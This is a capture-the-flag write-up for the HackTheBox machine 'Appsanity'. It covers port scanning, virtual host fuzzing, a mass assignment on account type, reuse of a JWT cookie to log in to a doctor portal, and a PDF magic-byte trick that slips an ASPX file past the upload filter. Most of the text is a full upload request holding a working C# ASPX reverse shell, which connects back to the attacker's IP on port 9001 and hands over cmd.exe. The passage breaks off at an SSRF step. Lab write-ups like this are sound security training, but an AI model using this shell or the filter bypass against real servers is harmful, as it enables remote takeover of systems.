---
layout: post
title: Appsanity - Hard - Windows
date: 28-10-2023
categories: [CTF - HackTheBox]
tag: [Mass Assignment Vulnerability, DLL Reversing, Virtual Host, ASPX, DLL Hijacking, Filter Bypass]
---

# NMAP Results

```
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ cat portscan      
# Nmap 7.94SVN scan initiated Wed Mar 13 04:14:00 2024 as: nmap -sCV -p- -oN portscan -v 10.10.11.238
Nmap scan report for 10.10.11.238
Host is up (0.027s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://meddigi.htb/
443/tcp  open  https?
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 13 04:16:52 2024 -- 1 IP address (1 host up) scanned in 171.36 seconds
```

# Subdomain enumeration
wfuzz revealed a virtual host `portal.meddigi.htb` by fuzzing the host header with a common wordlist.

```
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ wfuzz -u https://meddigi.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.meddigi.htb' --hc 400,404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://meddigi.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000048:   200        56 L     162 W      2976 Ch     "portal"                                                                                                                    
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 26.74989
Processed Requests: 8272
Filtered Requests: 8271
Requests/sec.: 309.2348

```

# Update /etc/hosts

Updated the hosts file on my local machine to resolve the discovered virtual host.

```
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ cat /etc/hosts                               
127.0.0.1   localhost
127.0.1.1   kali
::1     localhost ip6-localhost ip6-loopback
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters

10.10.11.238 meddigi.htb portal.meddigi.htb meddigi
```

# Inspecting Port 80/443

IIS is hosting a medical services website. The only thing of interest on the frontpage is a registration page.

![e284e4e5ce86e71d3e145bebb389e8ab.png](/assets/img/e284e4e5ce86e71d3e145bebb389e8ab.png)

# Inspecting Registration Process

Intercepting the registration request with burpsuite revealed the parameters sent in the request. The cookies reveal ASP.net is being used which is to expected with IIS. The most interesting parameter is `Acctype=1`. A mass assignment vulnerability may be possible.

```
POST /Signup/SignUp HTTP/2
Host: meddigi.htb
Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8EMRe_ReFCJDsBGjtqPG_3_mdw28JETnFBopuLp6k_ZpHbTJTnJ56aIxzqdfiBXV1EDtcgvr5ETymL1DONXpPWsFoav_mxb9fA24zwvNEnjrAH5KRB6b8Mn6xyAEoh7fknejGMQ3A7xPKPji-Ka0xPA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 346
Origin: https://meddigi.htb
Referer: https://meddigi.htb/signup
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

Name=bob&LastName=ross&Email=bobross%40test.com&Password=password123&ConfirmPassword=password123&DateOfBirth=2024-03-13&PhoneNumber=8800000000&Country=UK&Acctype=1&__RequestVerificationToken=CfDJ8EMRe_ReFCJDsBGjtqPG_3_vFKXatEYvJO_W7ShzG7VTLFrQZ7MkYxjrUNaW9n3AEjsqIohLkcQkWsAq40JqqI6vs14u1S0bMaZ83WEaZWB534kRTFDTl--MgllsR3guo_XFv9VFg9d-7i0eHNN69Us
```

# Changing Account Type
Sending a registration request with `Acctype=2` worked. It unlocked a new feature which allows patients to be added. However after testing this new feature it did not seem to lead anywhere. On a positive note the feature unlock does prove the registration process is vulerable to mass assignment.

```
POST /Signup/SignUp HTTP/2
Host: meddigi.htb
Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8EMRe_ReFCJDsBGjtqPG_3_mdw28JETnFBopuLp6k_ZpHbTJTnJ56aIxzqdfiBXV1EDtcgvr5ETymL1DONXpPWsFoav_mxb9fA24zwvNEnjrAH5KRB6b8Mn6xyAEoh7fknejGMQ3A7xPKPji-Ka0xPA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 347
Origin: https://meddigi.htb
Referer: https://meddigi.htb/signup
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

Name=bob&LastName=ross&Email=bobross2%40test.com&Password=password123&ConfirmPassword=password123&DateOfBirth=2024-03-13&PhoneNumber=0000000000&Country=UK&Acctype=2&__RequestVerificationToken=CfDJ8EMRe_ReFCJDsBGjtqPG_3_E80rk9wMKW9DSLywyG9qfig-RJcS9FvE4UIQ5kr_E7PGUUp3zgmnP1LUXpbpTgNDRebv9QdTSpvHXw2IuaJilsfWx-3ToSx59dbf9GzpWqXIK7ATk1h4_uDdMYakvOSA
```

# Inspecting VHOST (https://portal.meddigi.htb/)

The portal expects an email address and a doctor reference number to proceed. It was not vulnerable to SQL injection and fuzzing for the email/number was not realistic. With nothing left to enumerate it must be possible to bypass this login page.

![66408659ee21878c95700b48f3d48f37.png](/assets/img/66408659ee21878c95700b48f3d48f37.png)

```
POST /Login/Signin HTTP/1.1
Host: portal.meddigi.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portal.meddigi.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: https://portal.meddigi.htb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

Email=bobross2%40test.com&DoctorRefNumber=12345
```

# Recycling Cookies

It turned out the way forward was to reuse the authorization cookie from the root web application. Since the cookies are generated from the same JWT seed they are cross compatible on different domains.

Manually creating a cookie object within the web developer tools of Firefox and adding the values resulted in a successful login.

```
GET /Login HTTP/2
Host: portal.meddigi.htb
Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjgiLCJlbWFpbCI6ImJvYnJvc3MyQHRlc3QuY29tIiwibmJmIjoxNzEwMzE4NTU2LCJleHAiOjE3MTAzMjIxNTYsImlhdCI6MTcxMDMxODU1NiwiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.UgFxoc90Tyd3-XhfbfJdgc45R78ZmwjnX1cdnx06Y-E
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portal.meddigi.htb/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

```

The portal offers a lot of new features to test. The upload feature is very interesting as it could be used to upload a ASP shell.

![6779ee2166fa7ac10af664579320a030.png](/assets/img/6779ee2166fa7ac10af664579320a030.png)

# Inspecting File Upload Feature

The upload feature has some protections in place. After trying to upload an ASP file it will deny the request and present an error message saying only PDF files are allowed. To try bypass this protection I will try change the file extension and the magic bytes with burpsuite before sending the request.

```
POST /ExamReport/Upload HTTP/2
Host: portal.meddigi.htb
Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjgiLCJlbWFpbCI6ImJvYnJvc3MyQHRlc3QuY29tIiwibmJmIjoxNzEwMzE4NTU2LCJleHAiOjE3MTAzMjIxNTYsImlhdCI6MTcxMDMxODU1NiwiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.UgFxoc90Tyd3-XhfbfJdgc45R78ZmwjnX1cdnx06Y-E; .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8NNz9WV7ZtNOuDxWQ_EDu3VXRdTIujl_C4ljqEttxw7pmaEI63WpiHYEWp-TGNV1G_U2ee7ZIjVkRLJeM1dzE9THPEuYi6Pkr5j290lnBFWjp8uQRB4SceCGVBjIndtOmFuC3xjdwRmHh2UVt_0Drwo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------23290018502597167267593313735
Content-Length: 4570
Origin: https://portal.meddigi.htb
Referer: https://portal.meddigi.htb/examreport
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------23290018502597167267593313735

Content-Disposition: form-data; name="PatientNo"

123456
-----------------------------23290018502597167267593313735

Content-Disposition: form-data; name="PatientName"

john
-----------------------------23290018502597167267593313735

Content-Disposition: form-data; name="ExamType"

PCI
-----------------------------23290018502597167267593313735

Content-Disposition: form-data; name="PhoneNumber"

0000000000
-----------------------------23290018502597167267593313735
Content-Disposition: form-data; name="Department"

B
-----------------------------23290018502597167267593313735

Content-Disposition: form-data; name="VisitDate"

0001-01-01
-----------------------------23290018502597167267593313735

Content-Disposition: form-data; name="ReportFile"; filename="shell.asp"
Content-Type: application/x-asp

<%
test
</address>
</body>
</html>


-----------------------------23290018502597167267593313735
Content-Disposition: form-data; name="__RequestVerificationToken"

CfDJ8NNz9WV7ZtNOuDxWQ_EDu3Ujb_Tib32GCt19q_LSD55D2Z82NVZftPkMUSj5U5qLWb5UlJt7id1U5JFGaTFBUAZNxdd9IcioKueOS4C_9jJqqKCGvNqt65raKzhBDrJFiHv8YHMz3j9xFpe6s_-Dlb43nZtdHQN1lYzIlWfAiCHDyWrYkBD8wIHjd5_VWz1_Zg

-----------------------------23290018502597167267593313735--
```

```
 Invalid file format. Only PDF files are allowed. 
```

# Bypassing File Upload Filters

Typically file upload blacklists will check the file extension and the magic bytes of a file to determine if it needs blocked. In this case the application was checking the magic bytes of the file. `xxd` can be used to check the magic bytes of any file as shown below for a PDF.

```
┌──(kali㉿kali)-[~/htb/appsanity]
└─$ head /usr/share/texmf/doc/latex/preview/preview.pdf | xxd 
00000000: 2550 4446 2d31 2e35 0a25 d0d4 c5d8 0a37  %PDF-1.5.%.....7
00000010: 3320 3020 6f62 6a0a 3c3c 0a2f 4c65 6e67  3 0 obj.<<./Leng
00000020: 7468 2032 3531 3620 2020 2020 200a 2f46  th 2516      ./F
00000030: 696c 7465 7220 2f46 6c61 7465 4465 636f  ilter /FlateDeco
00000040: 6465 0a3e 3e0a 7374 7265 616d 0a78 dab5  de.>>.stream.x..
```

Next step will require intercepting the upload request with burpsuite and changing the magic bytes of the file before sending it. Below is a copy of the full request to do so. ASPX shell included.

Key area (%PDF-1.5):
```
-----------------------------133648358925764398862306719856
Content-Disposition: form-data; name="ReportFile"; filename="shell.aspx"
Content-Type: application/octet-stream

%PDF-1.5
<%@ Page Language="C#" %>
```

Full request: 

```c#
POST /ExamReport/Upload HTTP/2
Host: portal.meddigi.htb
Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjgiLCJlbWFpbCI6ImJvYnJvc3MyQHRlc3QuY29tIiwibmJmIjoxNzEwMzE4NTU2LCJleHAiOjE3MTAzMjIxNTYsImlhdCI6MTcxMDMxODU1NiwiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.UgFxoc90Tyd3-XhfbfJdgc45R78ZmwjnX1cdnx06Y-E; .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8NNz9WV7ZtNOuDxWQ_EDu3VXRdTIujl_C4ljqEttxw7pmaEI63WpiHYEWp-TGNV1G_U2ee7ZIjVkRLJeM1dzE9THPEuYi6Pkr5j290lnBFWjp8uQRB4SceCGVBjIndtOmFuC3xjdwRmHh2UVt_0Drwo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------133648358925764398862306719856
Content-Length: 17270
Origin: https://portal.meddigi.htb
Referer: https://portal.meddigi.htb/ExamReport
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------133648358925764398862306719856
Content-Disposition: form-data; name="PatientNo"

123456
-----------------------------133648358925764398862306719856
Content-Disposition: form-data; name="PatientName"

john
-----------------------------133648358925764398862306719856
Content-Disposition: form-data; name="ExamType"

PCI
-----------------------------133648358925764398862306719856
Content-Disposition: form-data; name="PhoneNumber"

0000000000
-----------------------------133648358925764398862306719856
Content-Disposition: form-data; name="Department"

B
-----------------------------133648358925764398862306719856
Content-Disposition: form-data; name="VisitDate"

0001-01-01
-----------------------------133648358925764398862306719856
Content-Disposition: form-data; name="ReportFile"; filename="shell.aspx"
Content-Type: application/octet-stream

%PDF-1.5
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
    
    protected void Page_Load(object sender, EventArgs e)
    {
        String host = "10.10.14.47"; //CHANGE THIS
            int port = 9001; ////CHANGE THIS
                
        CallbackShell(host, port);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }
    
    
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName,
       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    public static uint INFINITE = 0xFFFFFFFF;
    
    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

    internal struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public int sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]
    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    public const int STD_INPUT_HANDLE = -10;
    public const int STD_OUTPUT_HANDLE = -11;
    public const int STD_ERROR_HANDLE = -12;
    
    [DllImport("kernel32")]
    static extern bool AllocConsole();


    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo, 
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern int inet_addr([In] string cp);
    [DllImport("ws2_32.dll")]
    private static extern string inet_ntoa(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint htonl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern uint ntohl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort htons(ushort ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort ntohs(ushort ip);   

    
   [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int send(
                                [In] IntPtr socketHandle,
                                [In] byte[] pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int recv(
                                [In] IntPtr socketHandle,
                                [In] IntPtr pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int closesocket(
                                       [In] IntPtr socketHandle
                                       );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern IntPtr accept(
                                  [In] IntPtr socketHandle,
                                  [In, Out] ref sockaddr_in socketAddress,
                                  [In, Out] ref int socketAddressSize
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int listen(
                                  [In] IntPtr socketHandle,
                                  [In] int backlog
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int bind(
                                [In] IntPtr socketHandle,
                                [In] ref sockaddr_in  socketAddress,
                                [In] int socketAddressSize
                                );


   public enum TOKEN_INFORMATION_CLASS
   {
       TokenUser = 1,
       TokenGroups,
       TokenPrivileges,
       TokenOwner,
       TokenPrimaryGroup,
       TokenDefaultDacl,
       TokenSource,
       TokenType,
       TokenImpersonationLevel,
       TokenStatistics,
       TokenRestrictedSids,
       TokenSessionId
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public static extern bool GetTokenInformation(
       IntPtr hToken,
       TOKEN_INFORMATION_CLASS tokenInfoClass,
       IntPtr TokenInformation,
       int tokeInfoLength,
       ref int reqLength);

   public enum TOKEN_TYPE
   {
       TokenPrimary = 1,
       TokenImpersonation
   }

   public enum SECURITY_IMPERSONATION_LEVEL
   {
       SecurityAnonymous,
       SecurityIdentification,
       SecurityImpersonation,
       SecurityDelegation
   }

   
   [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
       ref IntPtr DuplicateTokenHandle);

   

   const int ERROR_NO_MORE_ITEMS = 259;

   [StructLayout(LayoutKind.Sequential)]
   struct TOKEN_USER
   {
       public _SID_AND_ATTRIBUTES User;
   }

   [StructLayout(LayoutKind.Sequential)]
   public struct _SID_AND_ATTRIBUTES
   {
       public IntPtr Sid;
       public int Attributes;
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool LookupAccountSid
   (
       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,
       IntPtr pSid,
       StringBuilder Account,
       ref int cbName,
       StringBuilder DomainName,
       ref int cbDomainName,
       ref int peUse 

   );

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool ConvertSidToStringSid(
       IntPtr pSID,
       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);


   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern bool CloseHandle(
       IntPtr hHandle);

   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
   [Flags]
   public enum ProcessAccessFlags : uint
   {
       All = 0x001F0FFF,
       Terminate = 0x00000001,
       CreateThread = 0x00000002,
       VMOperation = 0x00000008,
       VMRead = 0x00000010,
       VMWrite = 0x00000020,
       DupHandle = 0x00000040,
       SetInformation = 0x00000200,
       QueryInformation = 0x00000400,
       Synchronize = 0x00100000
   }

   [DllImport("kernel32.dll")]
   static extern IntPtr GetCurrentProcess();

   [DllImport("kernel32.dll")]
   extern static IntPtr GetCurrentThread();


   [DllImport("kernel32.dll", SetLastError = true)]
   [return: MarshalAs(UnmanagedType.Bool)]
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool EnumProcessModules(IntPtr hProcess,
    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,
    uint cb,
    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);

    [DllImport("psapi.dll")]
    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);

    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    public const uint PIPE_ACCESS_INBOUND = 0x00000001;
    public const uint PIPE_WAIT = 0x00000000;
    public const uint PIPE_NOWAIT = 0x00000001;
    public const uint PIPE_READMODE_BYTE = 0x00000000;
    public const uint PIPE_READMODE_MESSAGE = 0x00000002;
    public const uint PIPE_TYPE_BYTE = 0x00000000;
    public const uint PIPE_TYPE_MESSAGE = 0x00000004;
    public const uint PIPE_CLIENT_END = 0x00000000;
    public const uint PIPE_SERVER_END = 0x00000001;
    public const uint PIPE_UNLIMITED_INSTANCES = 255;

    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
    public const uint NMPWAIT_NOWAIT = 0x00000001;
    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

    public const uint GENERIC_READ = (0x80000000);
    public const uint GENERIC_WRITE = (0x40000000);
    public const uint GENERIC_EXECUTE = (0x20000000);
    public const uint GENERIC_ALL = (0x10000000);

    public const uint CREATE_NEW = 1;
    public const uint CREATE_ALWAYS = 2;
    public const uint OPEN_EXISTING = 3;
    public const uint OPEN_ALWAYS = 4;
    public const uint TRUNCATE_EXISTING = 5;

    public const int INVALID_HANDLE_VALUE = -1;

    public const ulong ERROR_SUCCESS = 0;
    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
    public const ulong ERROR_PIPE_BUSY = 231;
    public const ulong ERROR_NO_DATA = 232;
    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
    public const ulong ERROR_MORE_DATA = 234;
    public const ulong ERROR_PIPE_CONNECTED = 535;
    public const ulong ERROR_PIPE_LISTENING = 536;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipe(
        String lpName,                                  
        uint dwOpenMode,                                
        uint dwPipeMode,                                
        uint nMaxInstances,                         
        uint nOutBufferSize,                        
        uint nInBufferSize,                         
        uint nDefaultTimeOut,                       
        IntPtr pipeSecurityDescriptor
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(
        IntPtr hHandle,
        uint lpOverlapped
        );

    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(
        IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetNamedPipeHandleState(
        IntPtr hHandle,
        IntPtr lpState,
        IntPtr lpCurInstances,
        IntPtr lpMaxCollectionCount,
        IntPtr lpCollectDataTimeout,
        StringBuilder lpUserName,
        int nMaxUserNameSize
        );
 
    protected void CallbackShell(string server, int port)
    {

        string request = "Spawn Shell...\n";
        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);

        IntPtr oursocket = IntPtr.Zero;
        
        sockaddr_in socketinfo;
        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);
        socketinfo = new sockaddr_in();
        socketinfo.sin_family = (short) AddressFamily.InterNetwork;
        socketinfo.sin_addr = inet_addr(server);
        socketinfo.sin_port = (short) htons((ushort)port);
        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));
        send(oursocket, bytesSent, request.Length, 0);
        SpawnProcessAsPriv(oursocket);
        closesocket(oursocket);
    }

    protected void SpawnProcess(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101;
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
    }

    protected void SpawnProcessAsPriv(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101; 
        IntPtr DupeToken = new IntPtr(0);
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        if (DupeToken == IntPtr.Zero)
            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        else
            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
        CloseHandle(DupeToken);
    }
    </script>

-----------------------------133648358925764398862306719856
Content-Disposition: form-data; name="__RequestVerificationToken"

CfDJ8NNz9WV7ZtNOuDxWQ_EDu3U2VE4EGihORsyslac_6dzIMrbgjChT5kmJnSduMjPMJqNmAuzfVkrkNNIqKvuofAofwhEXG-F6NqSSLufmHhYPccmSls-yWDBKttqazRpLcHltiCwNqMqBPZ6QAhUSMsvJw9H7BCxR-Au5m1gFc-IWGFnHQlAiEHv6_EpI0_bBqw
-----------------------------133648358925764398862306719856--

```

Outcome: Success. The file was successfully uploaded.

```sh
 Examination report sent to the management. 
```

# Locating Uploads Directory
Now there is an ASPX shell on the server the next step will require accessing it to get code execution. To do that it will be necessary to know its exact location. Fuzzing the web directory for an uploads directory didnt lead anywhere. The upload itself may also have unique randomly generated ID making it impossible to find via fuzzing.

The portal application has more features which have not been tested yet. After testing the prescriptions feature it was vulnerable to SSRF. Below is an example of it connecting back to a python server hosted on my machine.

